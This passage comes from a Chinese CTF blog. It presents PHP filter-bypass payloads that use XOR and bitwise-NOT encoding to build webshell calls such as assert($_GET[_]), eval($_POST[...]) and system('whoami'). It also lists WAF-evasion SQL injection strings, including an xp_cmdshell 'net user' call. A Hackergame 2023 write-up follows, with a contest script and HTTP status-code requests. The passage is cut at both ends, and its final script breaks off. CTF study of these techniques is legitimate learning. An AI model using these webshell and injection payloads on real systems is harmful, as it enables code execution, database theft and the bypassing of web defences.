，利用这些字符进行异或可以得到我们想要的字符</p><blockquote><p>PS：取 ASCII 表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p></blockquote><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;assert&quot;</span></span><br><span class="line">strlist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">125</span>, <span class="number">126</span>, <span class="number">127</span>]</span><br><span class="line"><span class="comment">#strlist是ascii表中所有非字母数字的字符十进制</span></span><br><span class="line">str1,str2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strlist:</span><br><span class="line">            <span class="keyword">if</span>(i ^ j == <span class="built_in">ord</span>(char)):</span><br><span class="line">                i = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br><span class="line">                j = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;0&#125;&#x27;^&#x27;&#123;1&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(i,j),end=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);</span><br><span class="line"><span class="comment">//$_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);</span><br><span class="line"><span class="comment">//$__=&#x27;_GET&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="comment">//$___=&#x27;$_GET&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"><span class="comment">//assert($_GET[_]);</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p>当过滤字符的范围没有那么大，或者只是过滤关键字的时候可以使用如下脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char = string.printable</span><br><span class="line">cmd = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> char:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(res)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;&#125;&#x27;^&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(tmp1,tmp2))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(&#x27;000000&#x27;^&#x27;CICDU]&#x27;);&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(6) &quot;system&quot;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210113191434628.png?raw=true" alt="在这里插入图片描述"></p><p>再放个网上看到的 payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure><h2 id="url编码取反绕过"><a class="markdownIt-Anchor" href="#url编码取反绕过">#</a> <strong>URL 编码取反绕过</strong></h2><p>还是上面的例题</p><p>当 PHP&gt;=7 时，可以直接利用取反构造 payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;phpinfo&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br><span class="line"><span class="comment">#phpinfo();</span></span><br></pre></td></tr></table></figure><p>这里给一个 php 的转化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">92</span>%<span class="number">90</span>%<span class="number">9</span>C%<span class="number">97</span>%<span class="number">8</span>A%C8%A2%D6%D6);  <span class="comment">//别忘了后面的分号</span></span><br><span class="line">或者：</span><br><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[%<span class="number">27</span>a%<span class="number">27</span>])</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2021011322442091.png?raw=true" alt="在这里插入图片描述"></p><p>有参数的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;system&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(18) &quot;%8C%86%8C%8B%9A%92&quot;</span><br><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;whoami&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(18) &quot;%88%97%90%9E%92%96&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>E%<span class="number">92</span>%<span class="number">96</span>);</span><br><span class="line"><span class="comment">#system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210113225437499.png?raw=true" alt="在这里插入图片描述"></p><h2 id="如何绕过waf"><a class="markdownIt-Anchor" href="#如何绕过waf">#</a> <strong>如何绕过 WAF</strong></h2><p>\1. 当我们在目标 URL 进行 SQL 注入测试时，可以通过修改注入语句中字母的大小写来触发 WAF 保护情况。如果 WAF 使用区分大小写的黑名单，则更改大小写可能会帮我们成功绕过 WAF 的过滤。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxxxx.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure><p>\2. 关键字替换 (在关键字中间可插入将会被 WAF 过滤的字符) – 例如 SELECT 可插入变成 SEL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxxxx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure><p>\3. 编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ URL encode</span><br><span class="line">　　page.php?id=1%252f%252a*/UNION%252f%252a /SELECT +Hex encode</span><br><span class="line">　　www.xxxxx.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…  　SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) +Unicode encode</span><br><span class="line">　　?id=10%D6‘%20AND%2201=2%23   　SELECT &#x27;?&#x27;=&#x27;A&#x27;; #1</span><br></pre></td></tr></table></figure><p>\4. 使用注释</p><p>在攻击字符串中插入注释。例如，/<em>!SELECT</em>/ 这样 WAF 可能就会忽略该字符串，但它仍会被传递给目标应用程序并交由 mysql 数据库处理。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　   　&#x27;union%a0select pass from users#  index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3   　?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</span><br></pre></td></tr></table></figure><p>\5. 某些函数或<a href="https://www.linuxcool.com/">命令</a>，因为 WAF 的过滤机制导致我们无法使用。那么，我们也可以尝试用一些等价函数来替代它们。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()   sleep() ==&gt;benchmark()   concat_ws()==&gt;group_concat()  substr((select &#x27;password&#x27;),1,1) = 0x70   　strcmp(left(&#x27;password&#x27;,1), 0x69) = 1      strcmp(left(&#x27;password&#x27;,1), 0x70) = 0   　strcmp(left(&#x27;password&#x27;,1), 0x71) = -1 mid()、substr() ==&gt; substring()  @@user ==&gt; user()  @@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure><p>\6. 使用特殊符号</p><p>这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ ` symbol: select `version()`; + +- :select+id-1+1.from users; + @:select@^1.from users; +Mysql function() as xxx +`、~、!、@、%、()、[]、.、-、+ 、|、%00 示例</span><br><span class="line">　　‘se’+’lec’+’t’   %S%E%L%E%C%T 1   1.aspx?id=1;EXEC(‘ma’+&#x27;ster..x’+&#x27;p_cm’+&#x27;dsh’+&#x27;ell ”net user”’)  &#x27; or --+2=- -!!!&#x27;2    　 id=1+(UnI)(oN)+(SeL)(EcT)</span><br></pre></td></tr></table></figure><p>\7. HTTP 参数控制<br>　　<br>通过提供多个参数 = 相同名称的值集来混淆 WAF。例如 <a href="http://www.xxxxx.com?id=1&amp;?id=%E2%80%99">http://www.xxxxx.com?id=1&amp;?id=’</a> or ‘1’=’1′ — ‘在某些情况下 (例如使用 Apache/PHP)，应用程序将仅解析最后 (第二个) id= 而 WAF 只解析第一个。在应用程序看来这似乎是一个合法的请求，因此应用程序会接收并处理这些恶意输入。如今，大多数的 WAF 都不会受到 HTTP 参数污染 (HPP) 的影响，但仍然值得一试。</p><p>+ HPP(HTTP Parameter Polution))</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">　　/?id=1;select+1,2,3+from+users+where+id=1—   　/?id=1;select+1&amp;id=2,3+from+users+where+id=1—   　/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</span><br></pre></td></tr></table></figure><p>HPP 又称做重复参数污染，最简单的就是？uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的 Web 服务器处理方式如下：</p><p>+HPF (HTTP Parameter Fragment)</p><p>这种方法是 HTTP 分割注入，同 CRLF 有相似之处 (使用控制字符 %0a、%0d 等执行换行)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--   select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</span><br></pre></td></tr></table></figure><p>+HPC (HTTP Parameter Contamination)<br> RFC2396 定义了以下字符：<br> <code>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' () Reserved : ; / ? : @ &amp; = + $ , Unwise : &#123; &#125; | \ ^ [ ] </code>  ` 不同的 Web 服务器处理处理构造得特殊请求时有不同的逻辑：以魔术字符 % 为例，Asp/Asp.net 会受到影响。</p><p>\8. 缓冲区溢出</p><p>WAF 和其他所有的应用程序一样也存在着各种缺陷和漏洞。如果出现缓冲区溢出的情况，那么 WAF 可能就会崩溃，即使不能代码执行那也会使 WAF 无法正常运行。这样，WAF 的安全防护自然也就被瓦解了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br></pre></td></tr></table></figure><p>\9. 整合绕过</p><p>当使用单一的方式无法绕过时，我们则可以灵活的将多种方式结合在一起尝试。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.xxxxx.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…   id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -   ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame-2023</title>
      <link href="/2023/11/12/Hackergame-2023/"/>
      <url>/2023/11/12/Hackergame-2023/</url>
      
        <content type="html"><![CDATA[<h2 id="hackergame-启动"><a class="markdownIt-Anchor" href="#hackergame-启动">#</a> <strong>Hackergame 启动</strong></h2><p>​利用 burpsuite 拦截发送相似度的报文，对相似度修改为 100 即可。</p><h2 id="猫咪小测"><a class="markdownIt-Anchor" href="#猫咪小测">#</a> <strong>猫咪小测</strong></h2><p>第一问搜索得值中科大中外书籍存在西区图书馆 12 楼，第二问在 arXiv 上搜索 chick 即可，当然也可以暴力，第三问 gpt 或者 CSDN，第四问 Google 搜索关键词 python typing check,halting problem, 检索 2023 年的文献即可得到 ECOOP 为会议。</p><h2 id="更深更暗"><a class="markdownIt-Anchor" href="#更深更暗">#</a> <strong>更深更暗</strong></h2><p>直接在浏览器 F12 和 ctrl+f 搜索 flag 即可</p><h2 id="旅行照片"><a class="markdownIt-Anchor" href="#旅行照片">#</a> <strong>旅行照片</strong></h2><p>根据图片或奖得主锁定东京大学，google 即可的出东京大学诺贝尔奖得主信息。</p><p>再实景地图找公园，锁定活动在 googl 找到相关线上志愿报名，门票钱搜索可知东京大学学生免费。</p><h2 id="赛博井字棋"><a class="markdownIt-Anchor" href="#赛博井字棋">#</a> <strong>赛博井字棋</strong></h2><p>burpsuite 抓包发现下的棋子通过 x 和 y 定位，在棋盘本身不能下到电脑下过的地方，试一下修改 x,y 值到电脑下过的地方，发现覆盖，即可获胜。</p><h2 id="奶奶睡前的flag"><a class="markdownIt-Anchor" href="#奶奶睡前的flag">#</a> <strong>奶奶睡前的 flag</strong></h2><p>这道题之前做过类似的似乎（虽然我做的题很少很少，但还是想起来最近某次比赛一道没做出来的 MISC 里有这么一道，当时是 windows 的 snipping tools 的 bug），遂搜索，发现 google 手机也能利用这个漏洞，在 github 上翻出源码，执行选择最老的 google 手机即可获取 flag。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/1.png?raw=true" alt="600"></p><p>通过抓包获取撤回信息的格式，直接上脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 定义基本的 URL 和请求头</span><br><span class="line">BASE_URL = &quot;http://202.38.93.111:10021&quot;</span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://202.38.93.111:10021&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://202.38.93.111:10021/&quot;,</span><br><span class="line">    &quot;Cookie&quot;: &quot;session=eyJ0b2tlbiI6IjQ1MzpNRVVDSUJ3ZE1jd1RURkR2RlZwSGFRcXE0Tm94bzBSdnVGRDZzdExFNTJHOU42NlNBaUVBOEdXWGRXY1orN2pIeXFneUxxQTIyWDZDc2RoY3ZLblVPNjNjemFLMy8xUT0ifQ.ZTz5oQ.59uj_HyyOdElcS6oMKyqOq2koDo&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 获取消息</span><br><span class="line">def get_messages():</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/getMessages&quot;, headers=HEADERS)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.json()</span><br><span class="line">    return []</span><br><span class="line"></span><br><span class="line"># 删除消息</span><br><span class="line">def delete_message(message_id):</span><br><span class="line">    payload = &#123;&quot;id&quot;: message_id&#125;</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/deleteMessage&quot;, headers=HEADERS, json=payload)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        print(&quot;delete message: &quot;,message_id,&#x27; &#x27;, response.text,&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">def get_flag():</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/getflag&quot;, headers=HEADERS)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.text</span><br><span class="line">    return None</span><br><span class="line"># 主执行逻辑</span><br><span class="line">start_time = time.time()</span><br><span class="line">messages = get_messages()</span><br><span class="line">print(messages)</span><br><span class="line">i = 0 </span><br><span class="line">lastmessage = &#x27;&#x27;</span><br><span class="line">for message in messages[&#x27;messages&#x27;]:</span><br><span class="line">    match = re.search(r&#x27;hack\[[a-z]+\]&#x27;, message[&#x27;text&#x27;])</span><br><span class="line">    </span><br><span class="line">    if match:</span><br><span class="line">        while(1):</span><br><span class="line">            # print(i)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            if end_time - start_time &gt; message[&#x27;delay&#x27;] :</span><br><span class="line">                delete_message(i)  # 这里假设每个消息还有一个&#x27;id&#x27;字段。如果没有，你需要根据实际情况进行调整。</span><br><span class="line">                break</span><br><span class="line">    print(&#x27; &#x27;,message,&#x27;\n&#x27;)</span><br><span class="line">    i = i + 1</span><br><span class="line">    lastmessage=message</span><br><span class="line">time.sleep(7)</span><br><span class="line">flag = get_flag()</span><br><span class="line">print(&quot;Received flag:&quot;, flag)</span><br></pre></td></tr></table></figure><p>这里有个坑是发送时间不能在 delay 的时间之前发送，会显示<strong>时空错误</strong>，另外完成后要等待 7 秒左右再连接 getflag 接口，否则还是告诉你出错。</p><h2 id="虫"><a class="markdownIt-Anchor" href="#虫">#</a> <strong>虫</strong></h2><p>这道题要根据文字提示，告诉你这种方式可以接受 ISS 的图片，之后上网搜索，得值通过 SSTV 的方式获取 ISS 定时发送的图片。下载音频后下载相关的软件即可，这里由于声音较为刺耳，下载了虚拟音频驱动来播放（怕被室友打），第一次费好大劲下的 MMSSTV 还用不了，我还以为思路错了，之后用 RXSSTV 即可成功获取 flag。</p><h2 id="json-属于-yaml"><a class="markdownIt-Anchor" href="#json-属于-yaml">#</a> <strong>JSON 属于 YAML？</strong></h2><p>搜索即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag1: &#123;&#x27;value&#x27;:1e233&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag2: &#123;&#x27;va&#x27;:1,&#x27;va&#x27;:2&#125;</span><br></pre></td></tr></table></figure><h2 id="http集邮册"><a class="markdownIt-Anchor" href="#http集邮册">#</a> <strong>HTTP 集邮册</strong></h2><p>获取状态吗：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /file HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Range: bytes=5000-10000\r\n\r\n</span><br><span class="line"></span><br><span class="line">416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Range: bytes=0-999\r\n\r\n</span><br><span class="line"></span><br><span class="line">206 Partial Content</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host</span><br><span class="line"></span><br><span class="line">400 Bad Request</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">405 Not Allowed</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Content-Length: 10000000\r\n</span><br><span class="line">\r\n</span><br><span class="line">&#123;appl&#125;</span><br><span class="line"></span><br><span class="line">413 Request Entity Too Large</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">EXPECT: 100-continue\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br><span class="line">100 Continue</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /verylongpath/...[repeat many times]... HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">414 URI Too Long </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/2.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">505 HTTP Version Not Supported</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">200 OK</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /thispagedoesnotexist HTTP/1.1\r\n</span><br><span class="line">Host: www.baidu.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">404 Not Found</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\r\n\r\n</span><br><span class="line"></span><br><span class="line">304 Not Modified</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">If-Match: 121\r\n\r\n</span><br><span class="line"></span><br><span class="line">412 Precondition Failed</span><br></pre></td></tr></table></figure><h2 id="docker-for-everyone"><a class="markdownIt-Anchor" href="#docker-for-everyone">#</a> <strong>Docker for Everyone</strong></h2><p>题目给出了提示，通过 docker 提权即可，再启动 docker 时 -------- 之后 cat 软连接即可</p><h2 id="惜字如金"><a class="markdownIt-Anchor" href="#惜字如金">#</a> <strong>惜字如金</strong></h2><p>需要写脚本暴力，代码给出提示，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check_equals(set(len(s) for s in code_dict), &#123;24&#125;)</span><br></pre></td></tr></table></figure><p>每个有 24 个字符，而上面经过惜字如金处理之后为 23 个，故暴力出所有可能即可。</p><p>上代码：（写的不好，这里纯纯自己手打获取的所有可能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_str = &#x27;nymeh1niwemflcir&#125;echaet&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs1 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str[:index] + s + my_str[index:]</span><br><span class="line">        strs1.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span 